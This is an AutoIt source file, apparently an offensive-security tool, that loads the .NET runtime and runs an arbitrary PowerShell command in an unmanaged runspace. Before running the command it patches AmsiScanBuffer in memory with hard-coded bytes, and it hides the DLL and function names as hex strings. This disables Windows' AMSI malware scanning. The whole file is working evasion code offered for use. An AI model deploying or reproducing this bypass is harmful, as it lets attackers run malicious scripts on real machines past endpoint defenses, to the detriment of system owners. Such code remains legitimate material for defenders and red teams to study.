#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_UseX64=y
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include ".\Includes\CLR.Au3"
#include <WinAPIRes.au3>
#include <WinAPISys.au3>
#include <String.au3>

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Hosts the CLR, bypasses AMSI & executes PowerShell through an unmanaged runspace.

 Notes:
	Credits for the original script - ptrex (https://www.autoitscript.com/forum/profile/6305-ptrex/)

 Reference:
    https://www.autoitscript.com/forum/topic/188158-net-common-language-runtime-clr-framework/
    https://www.autoitscript.com/forum/topic/190637-powershell-command-in-autoit/

#ce --------------------------------------------------------------------------------

; Title
ConsoleWrite(@CRLF & "=========== ExecutePowerShell ===========" & @CRLF & @CRLF)

; Commandline arguments check
_CheckArguments()

; Run PS command
_Run_PSHost_Script('')

#cs ----------------------------------------------------------------------------

Main functions:
    _CheckArguments()
    _PatchAMSI()
    _Run_PSHost_Script()

#ce ----------------------------------------------------------------------------

Func _CheckArguments()

    If $CmdLine[0] <= 0 Then
        ConsoleWrite("[X] You must provide a Powershell command" & @CRLF & @CRLF)
        ConsoleWrite('[i] ExecutePowerShell.exe "Get-Process"' & @CRLF & @CRLF)
        Exit

    ElseIf $CmdLine[0] > 1 Then
        ConsoleWrite("[X] Too many arguments provided." & @CRLF & @CRLF)
        ConsoleWrite('[i] ExecutePowerShell.exe "Get-Process"' & @CRLF & @CRLF)
        Exit

    EndIf

EndFunc ;==>_CheckArguments

Func _PatchAMSI()
    ; Adapted from - https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998
    ; Credits - FatRodzianko (https://github.com/FatRodzianko)
    ; Initial bypass technique discovered by Rastamouse (https://twitter.com/_RastaMouse)

    ConsoleWrite("[*] Patching AMSI" & @CRLF & @CRLF)

    ; Define patch bytes - specifically for 64 bit process
    $patchBytes = "0x31C0057801197F05DFFEED00C3"

    ; Get ASB location
    $adll = _HexToString("0x616d73692e646c6c")
    $amLib = _WinAPI_LoadLibrary($adll)
    If $amLib = 0 Then
        ConsoleWrite("[X] Couldn't load DLL." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Get ASB address
    $asb = _HexToString("0x416d73695363616e427566666572")
    $asbLoc = _WinAPI_GetProcAddress($amLib, $asb)

    If $asbLoc = 0 Then
        ConsoleWrite("[X] Failed to get ASB memory address." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Patch length
    $patchSize = BinaryLen($patchBytes)

    ; VirtualProtect - make memory region writable
    $vpCall = DllCall("Kernel32.dll", "int", "VirtualProtect", _
        "ptr", $asbLoc, _
        "long", $patchSize, _
        "dword", 0x40, _
        "dword*", 0)

    $hProtect = $vpCall[0]
    $oldProtect = $vpCall[4]

    ; Byte array to the address
    Local $patchBuffer = DllStructCreate("byte[" & $patchSize & "]", $asbLoc)
    ; Copy patch
    DllStructSetData($patchBuffer, 1, $patchBytes)

    ; Restore region to RX
    $resCall = DllCall("Kernel32.dll", "int", "VirtualProtect", _
        "ptr", $asbLoc, _
        "long", $patchSize, _
        "dword", $oldProtect, _
        "dword*", 0)

    ConsoleWrite("  [+] AMSI patch successful" & @CRLF & @CRLF)

    ConsoleWrite("[*] Executing PowerShell command/script" & @CRLF & @CRLF)

EndFunc ;==>_PatchAMSI()

Func _Run_PSHost_Script($PSScript)
; Adapted from - https://www.autoitscript.com/forum/topic/190637-powershell-command-in-autoit/?tab=comments#comment-1368059
; Credits - ptrex (https://www.autoitscript.com/forum/profile/6305-ptrex/)

    Local $oAssembly = _CLR_LoadLibrary("System.Management.Automation")

    ; Create Object
    Local $pAssemblyType = 0
    $oAssembly.GetType_2("System.Management.Automation.PowerShell", $pAssemblyType)
    Local $oActivatorType = ObjCreateInterface($pAssemblyType, $sIID_IType, $sTag_IType)

    ; Create Object
    Local $pObjectPS = 0
    $oActivatorType.InvokeMember_3("Create", 0x158, 0, 0, 0, $pObjectPS)

    ; Run bypass before executing our command
    _PatchAMSI()

; <<<<<<<<<<<<<<<<<<< PS COMMAND HERE >>>>>>>>>>>>>>>>>>>>

    $pObjectPS.AddScript(String($CmdLine[1]))

; <<<<<<<<<<<<<<<<<<< Output >>>>>>>>>>>>>>>>>>>>

    $pObjectPS.AddCommand("Out-File")
    $sFile = @ScriptDir & "\output.log"
    $pObjectPS.AddArgument($sFile)

    $objAsync = $pObjectPS.BeginInvoke()

    While $objAsync.IsCompleted = False
        ContinueLoop
    WEnd

    $objPsCollection = $pObjectPS.EndInvoke($objAsync)

    ; Print output file location
    ConsoleWrite("  [i] PS command output written to: " & $sFile & @CRLF & @CRLF)

    ; Read output file
    ConsoleWrite("[*] Reading output file" & @CRLF & @CRLF)
    Sleep(1500)
    If FileExists($sFile) Then
        Local $sfileRead = FileRead($sFile)
        ConsoleWrite("[+] PS command output:" & @CRLF & @CRLF & $sfileRead)
    EndIf

    ; Delete output file
    ConsoleWrite(@CRLF & "[*] Deleting output file" & @CRLF & @CRLF)
    FileDelete($sFile)
    ConsoleWrite("  [i] Export file at '" & $sFile & "' has been deleted" & @CRLF & @CRLF)

    ConsoleWrite("[*] Done" & @CRLF & @CRLF)

EndFunc ;==>_Run_PSHost_Script($PSScript)
